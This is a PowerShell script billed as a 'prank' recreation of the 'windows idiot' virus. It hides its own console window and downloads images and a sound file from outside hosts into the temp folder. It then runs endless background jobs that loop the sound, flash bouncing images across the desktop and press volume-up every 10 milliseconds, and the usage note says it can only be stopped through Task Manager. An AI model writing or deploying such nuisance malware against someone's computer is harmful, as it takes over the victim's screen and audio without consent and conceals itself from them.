<# ================================================ WINDOWS IDIOT PRANK ========================================================

SYNOPSIS
This script is a powershell interpretation of the famous windows idiot virus.

USAGE
Run the script
stop in task manager (when console is hidden)

#>

Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms

# Hide the Powershell console
$hide = 1
if ($hide -eq 1){
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    
    if ($hwnd -ne [System.IntPtr]::Zero) {
        $Type::ShowWindowAsync($hwnd, 0)
    }
    else {
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

# Download sounds and images
iwr -Uri 'https://i.ibb.co/RpFpd34/wh.png' -OutFile "$env:TEMP\white.png"
iwr -Uri 'https://i.ibb.co/Nx16b06/bl.png' -OutFile "$env:TEMP\black.png" 
iwr -Uri 'https://github.com/beigeworm/assets/raw/main/idiot.wav' -OutFile "$env:TEMP\sound.wav"
sleep 1

# Loop sound
$job1 = {

    while ($true){
        (New-Object Media.SoundPlayer "$env:TEMP\sound.wav").Play();
        sleep 5
    }

}

# Loop images
$job2 = {  
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName System.Windows.Forms
    $image1 = [System.Drawing.Image]::FromFile("$env:TEMP\white.png")
    $image2 = [System.Drawing.Image]::FromFile("$env:TEMP\black.png")
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen
    $Width = $screen.Bounds.Width
    $Height = $screen.Bounds.Height
    $desktopHandle = [System.IntPtr]::Zero
    $graphics = [System.Drawing.Graphics]::FromHwnd($desktopHandle)
    $random = New-Object System.Random
    $x = 0
    $y = 200
    $dx = 15
    $dy = $random.Next(10, 25)
    $imageSize = 400
    $i = 1
    
    while ($true) { 
        if ($i -eq 1){
            $graphics.DrawImage($image1, $x, $y, $imageSize, $imageSize)
            $i = 0    
        }
        else{
            $graphics.DrawImage($image2, $x, $y, $imageSize, $imageSize)
            $i = 1
        }
        $x += $dx
        $y += $dy 
        if ($x + $imageSize -gt $Width -or $x -lt 0) {
            $dx = -$dx
        }
        if ($y + $imageSize -gt $Height -or $y -lt 0) {
            $dy = -$dy
        }
    }
}

# Volume up repeatedly
$job3 = {
    $wshell = New-Object -ComObject wscript.shell
    while ($true){
        $wshell.SendKeys([char]175)
        sleep -m 10
    }
}

# Start jobs
Start-Job -ScriptBlock $job1
Start-Job -ScriptBlock $job2
Start-Job -ScriptBlock $job3
sleep 17
Start-Job -ScriptBlock $job2
pause
